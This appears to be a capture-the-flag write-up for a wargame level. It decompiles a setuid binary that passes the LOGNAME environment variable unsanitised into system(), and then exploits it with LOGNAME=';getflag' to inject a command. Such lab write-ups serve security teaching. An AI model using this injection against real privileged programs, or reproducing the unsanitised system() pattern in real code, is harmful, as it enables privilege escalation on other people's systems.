
# LEVEL07

Upon arriving, you will notice a level07 executable.
When executing, it will only display its name, whatever the parameter you pass
Using SCP we can get the file locally, and we can use ghidra to disassemble it

```c
int main(int argc,char **argv,char **envp)

{
  char *pcVar1;
  int iVar2;
  char *buffer;
  gid_t gid;
  uid_t uid;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;
  
  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  pcVar1 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
  iVar2 = system(local_1c);
  return iVar2;
}
```

We can see that is prints the variable in LOGNAME.
Hence we can modify it to call the getflag command:

```sh
export LOGNAME=';getflag'
./level07
```
